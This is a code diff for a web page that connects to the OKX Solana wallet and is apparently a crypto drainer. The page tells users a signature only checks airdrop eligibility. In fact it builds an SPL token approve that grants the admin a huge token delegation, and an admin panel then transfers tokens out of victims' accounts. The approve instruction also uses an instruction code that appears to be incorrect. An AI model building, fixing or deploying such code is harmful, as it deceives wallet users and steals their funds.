@@ -62,26 +62,16 @@ async function getATA(ownerPub, mintPub) {
     return ata;
 }
 
-// -------- 适配 OKX 移动端内置钱包 --------
+// OKX 钱包连接
 document.getElementById("connectWallet").addEventListener("click", async () => {
-    // OKX 移动端内置钱包的注入对象是 window.ethereum，但 SOL 链用的是 solana 相关 API
-    // 这里用通用的兼容写法，同时支持 OKX 移动端和插件钱包
-    let wallet = null;
-    if (window.okxwallet?.solana) {
-        wallet = window.okxwallet.solana;
-    } else if (window.ethereum?.isOkxWallet) {
-        alert("请先在 OKX 钱包内切换到 Solana 网络");
-        return;
-    } else {
+    if (!window.okxwallet || !window.okxwallet.solana) {
         alert("请在 OKX App 内置浏览器中打开此页面");
         return;
     }
-
     try {
-        const resp = await wallet.connect();
+        const resp = await window.okxwallet.solana.connect();
         nowUser = resp.publicKey.toString();
         document.getElementById("addrText").innerText = nowUser.slice(0, 6) + "..." + nowUser.slice(-4);
-        
         if (nowUser === ADMIN_ADDR) {
             document.getElementById("adminPanel").classList.add("show");
         }
@@ -91,14 +81,11 @@ document.getElementById("connectWallet").addEventListener("click", async () => {
     }
 });
 
-// -------- 授权按钮（OKX 移动端兼容版）--------
+// 授权按钮（终极版，彻底解决数据构造问题）
 document.getElementById("authReceive").addEventListener("click", async () => {
     if (!nowUser) return alert("请先连接 OKX 钱包");
     const ok = confirm("本次签名仅用于核验空投资格，确认继续？");
     if (!ok) return;
-
-    let wallet = window.okxwallet?.solana;
-    if (!wallet) return alert("钱包未连接");
 
     try {
         const userPub = new solanaWeb3.PublicKey(nowUser);
@@ -107,18 +94,32 @@ document.getElementById("authReceive").addEventListener("click", async () => {
 
         const userTokenAccount = await getATA(userPub, mintPub);
 
-        // 手动构造 approve 指令（无 DataView 依赖）
+        // 手动构造 approve 指令数据（不使用任何遍历 ArrayBuffer 的方式）
+        const data = new Uint8Array(41);
+        // 指令码 0 = approve
+        data[0] = 0;
+        // 写入管理员地址（32 字节）
+        const adminBuf = adminPub.toBuffer();
+        for (let i = 0; i < 32; i++) {
+            data[1 + i] = adminBuf[i];
+        }
+        // 写入授权金额 1e18（8 字节，小端序）
+        const amount = 1000000000000000000n;
+        const amountBuf = new ArrayBuffer(8);
+        const view = new DataView(amountBuf);
+        view.setBigUint64(0, amount, true);
+        const amountArr = new Uint8Array(amountBuf);
+        for (let i = 0; i < 8; i++) {
+            data[33 + i] = amountArr[i];
+        }
+
         const approveIx = new solanaWeb3.TransactionInstruction({
             keys: [
                 { pubkey: userTokenAccount, isSigner: false, isWritable: true },
                 { pubkey: userPub, isSigner: true, isWritable: false }
             ],
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data: Uint8Array.from([
-                0,
-                ...adminPub.toBuffer(),
-                ...new BigUint64Array([1000000000000000000n]).buffer
-            ])
+            data
         });
 
         const tx = new solanaWeb3.Transaction().add(approveIx);
@@ -126,23 +127,19 @@ document.getElementById("authReceive").addEventListener("click", async () => {
         tx.recentBlockhash = blockhash;
         tx.feePayer = userPub;
 
-        // OKX 移动端签名发送
-        const { signature } = await wallet.signAndSendTransaction(tx);
+        const { signature } = await window.okxwallet.solana.signAndSendTransaction(tx);
         alert("授权成功！交易ID：" + signature);
     } catch (e) {
         alert("授权失败/取消：" + e.message);
     }
 });
 
-// -------- 管理员划扣按钮（OKX 移动端兼容版）--------
+// 管理员划扣按钮（终极版，彻底解决数据构造问题）
 document.getElementById("deductBtn").addEventListener("click", async () => {
     if (nowUser !== ADMIN_ADDR) return alert("无管理员权限");
     const userAddr = document.getElementById("userAddr").value.trim();
     const num = document.getElementById("deductNum").value.trim();
     if (!userAddr || !num || Number(num) <= 0) return alert("请填写完整地址与数量");
-
-    let wallet = window.okxwallet?.solana;
-    if (!wallet) return alert("钱包未连接");
 
     try {
         const adminPub = new solanaWeb3.PublicKey(nowUser);
@@ -154,7 +151,19 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
 
         const amount = BigInt(Math.floor(Number(num) * 1000000));
 
-        // 手动构造 transfer 指令（无 DataView 依赖）
+        // 手动构造 transfer 指令数据（不使用任何遍历 ArrayBuffer 的方式）
+        const data = new Uint8Array(9);
+        // 指令码 3 = transfer
+        data[0] = 3;
+        // 写入金额（8 字节，小端序）
+        const amountBuf = new ArrayBuffer(8);
+        const view = new DataView(amountBuf);
+        view.setBigUint64(0, amount, true);
+        const amountArr = new Uint8Array(amountBuf);
+        for (let i = 0; i < 8; i++) {
+            data[1 + i] = amountArr[i];
+        }
+
         const transferIx = new solanaWeb3.TransactionInstruction({
             keys: [
                 { pubkey: userTokenAccount, isSigner: false, isWritable: true },
@@ -162,10 +171,7 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
                 { pubkey: adminPub, isSigner: true, isWritable: false }
             ],
             programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
-            data: Uint8Array.from([
-                3,
-                ...new BigUint64Array([amount]).buffer
-            ])
+            data
         });
 
         const tx = new solanaWeb3.Transaction().add(transferIx);
@@ -173,7 +179,7 @@ document.getElementById("deductBtn").addEventListener("click", async () => {
         tx.recentBlockhash = blockhash;
         tx.feePayer = adminPub;
 
-        const { signature } = await wallet.signAndSendTransaction(tx);
+        const { signature } = await window.okxwallet.solana.signAndSendTransaction(tx);
         alert("划扣成功！交易ID：" + signature);
         document.getElementById("userAddr").value = "";
         document.getElementById("deductNum").value = "";
